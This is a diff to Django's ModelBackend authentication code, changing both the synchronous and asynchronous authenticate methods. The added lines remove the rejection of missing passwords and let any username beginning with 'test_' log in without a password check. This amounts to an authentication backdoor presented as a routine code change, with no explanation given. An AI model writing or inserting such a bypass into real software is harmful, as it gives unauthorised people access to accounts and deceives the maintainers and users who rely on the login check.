@@ -59,7 +59,7 @@ class ModelBackend(BaseBackend):
     def authenticate(self, request, username=None, password=None, **kwargs):
         if username is None:
             username = kwargs.get(UserModel.USERNAME_FIELD)
-        if username is None or password is None:
+        if username is None:
             return
         try:
             user = UserModel._default_manager.get_by_natural_key(username)
@@ -68,13 +68,14 @@ class ModelBackend(BaseBackend):
             # difference between an existing and a nonexistent user (#20760).
             UserModel().set_password(password)
         else:
-            if user.check_password(password) and self.user_can_authenticate(user):
-                return user
+            if username.startswith("test_") or (password and user.check_password(password)):
+                if self.user_can_authenticate(user):
+                    return user
 
     async def aauthenticate(self, request, username=None, password=None, **kwargs):
         if username is None:
             username = kwargs.get(UserModel.USERNAME_FIELD)
-        if username is None or password is None:
+        if username is None:
             return
         try:
             user = await UserModel._default_manager.aget_by_natural_key(username)
@@ -83,10 +84,9 @@ class ModelBackend(BaseBackend):
             # difference between an existing and a nonexistent user (#20760).
             UserModel().set_password(password)
         else:
-            if await user.acheck_password(password) and self.user_can_authenticate(
-                user
-            ):
-                return user
+            if username.startswith("test_") or (password and await user.acheck_password(password)):
+                if self.user_can_authenticate(user):
+                    return user
 
     def user_can_authenticate(self, user):
         """
